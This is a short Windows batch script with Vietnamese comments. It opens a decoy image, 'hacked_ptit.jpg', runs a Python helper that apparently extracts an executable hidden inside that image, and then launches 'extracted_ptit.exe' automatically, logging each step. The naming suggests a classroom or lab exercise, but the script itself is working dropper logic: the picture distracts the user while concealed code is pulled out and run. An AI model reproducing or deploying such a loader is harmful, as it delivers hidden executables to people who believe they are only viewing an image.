@echo off
setlocal
cd /d "%~dp0"

rem Log để bạn theo dõi tiến trình
echo [%date% %time%] run.bat started in "%CD%" > run.log
dir /b >> run.log

rem Mở ảnh ngay (không đợi extract xong)
start "" "hacked_ptit.jpg"

rem Gọi python bằng đường dẫn đầy đủ (đổi lại nếu máy bạn khác)
set "PY=%LocalAppData%\Programs\Python\Python311\python.exe"
if not exist "%PY%" (
  echo [%date% %time%] Python not found at "%PY%" >> run.log
  echo Use "py -3" or fix PY path. >> run.log
  exit /b 2
)

echo [%date% %time%] Starting extraction... >> run.log
"%PY%" "extracted_exe.py" >> run.log 2>&1
echo [%date% %time%] Extraction finished, errorlevel=%errorlevel% >> run.log

if exist "extracted_ptit.exe" (
  for %%A in ("extracted_ptit.exe") do echo [%date% %time%] extracted_ptit.exe size=%%~zA bytes >> run.log

  rem --- TỰ ĐỘNG THỰC THI EXE SAU KHI TÁCH THÀNH CÔNG ---
  echo [%date% %time%] Starting extracted_ptit.exe >> run.log
  start "" "extracted_ptit.exe"
) else (
  echo [%date% %time%] extracted_ptit.exe NOT FOUND >> run.log
)

endlocal
